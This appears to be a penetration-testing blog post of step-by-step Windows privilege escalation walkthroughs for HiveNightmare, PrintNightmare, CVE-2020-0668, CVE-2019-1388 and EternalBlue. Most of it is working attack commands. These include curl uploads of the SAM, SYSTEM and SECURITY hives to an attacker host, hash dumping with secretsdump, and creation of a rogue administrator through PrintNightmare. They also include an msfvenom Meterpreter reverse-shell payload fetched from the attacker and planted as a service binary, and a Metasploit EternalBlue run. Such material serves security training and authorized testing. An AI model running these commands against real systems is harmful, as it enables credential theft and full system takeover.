---
title: Windows Privilege Escalation CVEs
date: 2026-06-26 17:19:44

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Old Systems

tags:
  - Windows
  - Privilege-Escalation
  - CVE
  - HiveNightmare
  - SeriousSam
  - PrintNightmare
  - CVE-2021-36934
  - CVE-2021-34527
  - CVE-2021-1675
  - CVE-2020-0668
  - CVE-2019-1388
  - EternalBlue
  - MS17-010
  - SMBv1
  - Print-Spooler
  - UAC-Bypass
  - Registry-Hives
  - Metasploit
  - Meterpreter
  - Windows-Exploitation

cover: /img/windows-privesc-cves.png
top_img: /img/bg-img.jpg
description: Exploit common Windows privilege escalation vulnerabilities including HiveNightmare, PrintNightmare, CVE-2020-0668, CVE-2019-1388, and EternalBlue to obtain SYSTEM privileges.
---





## CVE-2021-36934 HiveNightmare / SeriousSam

> HiveNightmare allows low-privileged users to read the SAM, SYSTEM, and SECURITY registry hives from Volume Shadow Copies.

> Check if the machine is vulnerable.

```cmd
icacls C:\Windows\System32\config\SAM
```

> Dump the registry hives using HiveNightmare.

```powershell
.\HiveNightmare.exe
```

> Transfer the dumped hives to our machine.

```bash
➜ uploadserver
```

```powershell
curl.exe -F "files=@SAM" http://<attacker-ip>:8000/upload

curl.exe -F "files=@SYSTEM" http://<attacker-ip>:8000/upload

curl.exe -F "files=@SECURITY" http://<attacker-ip>:8000/upload
```

> Extract the password hashes.

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```



## CVE-2021-34527 / CVE-2021-1675 PrintNightmare

> PrintNightmare allows authenticated users to execute code as SYSTEM through the Print Spooler service.

> Verify that the Print Spooler service is running.

```powershell
ls \\localhost\pipe\spoolss
```

> Import the exploit.

```powershell
Import-Module .\CVE-2021-1675.ps1
```

> Create a local administrator.

```powershell
Invoke-Nightmare -NewUser "twistzz" -NewPassword "P@ssw0rd!" -DriverName "PrintIt"
```

> Verify the new account.

```cmd
net user twistzz
```



## CVE-2020-0668 Service Tracing File Move

> CVE-2020-0668 allows arbitrary file moves as SYSTEM, by chaining it with a vulnerable service, we can replace a privileged executable and execute code as SYSTEM.

> We can target any service running as SYSTEM by replacing its executable with our malicious binary, then start or restart the service to execute it.

> Generate a malicious payload.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker-ip> LPORT=8443 -f exe > maintenanceservice.exe
```

> Transfer the payload to the target.

```powershell
wget http://<attacker-ip>:8080/maintenanceservice.exe -O maintenanceservice.exe

wget http://<attacker-ip>:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

> Run the exploit to move the payload into the Mozilla Maintenance Service directory.

```cmd
CVE-2020-0668.exe C:\Users\<user>\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

> Verify that the payload is writable.

```cmd
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

> Replace the corrupted payload with the clean copy.

```cmd
copy /Y C:\Users\<user>\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

> Start the vulnerable service.

```cmd
net start MozillaMaintenance
```

> Catch the incoming Meterpreter session.

```text
use exploit/multi/handler

set PAYLOAD windows/x64/meterpreter/reverse_https

set LHOST <attacker-ip>

set LPORT 8443

exploit
```


## CVE-2019-1388 UAC Certificate Dialog


  
> ➜ CVE-2019-1388 is a UAC bypass where a specially signed Microsoft binary (e.g., `hhupd.exe`) allows viewing certificate information; this makes the `Issued by` field clickable in the certificate dialog, and clicking it opens a browser as `NT AUTHORITY\SYSTEM`, allowing us to escape and spawn a SYSTEM shell.

  
> First right click on the vulnerable binary `hhupd.exe` and select `Run as administrator` from the menu 

![NTLM Relay SMB to SMB](/img/1.png)

> Next, click on `Show information about the publisher's certificate` to open the certificate dialog.


![NTLM Relay SMB to SMB](/img/2.png)

> Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink.


![NTLM Relay SMB to SMB](/img/3.png)

> Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.

![NTLM Relay SMB to SMB](/img/4.png)


> At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

![NTLM Relay SMB to SMB](/img/5.png)



## MS17-010 EternalBlue

> MS17-010 (EternalBlue) is an SMBv1 vulnerability that allows remote code execution as SYSTEM on vulnerable Windows systems.

> Verify that SMBv1 is enabled.

```powershell
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

> Execute the Metasploit module.

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue

msf6 > set RHOSTS <target>

msf6 > run
```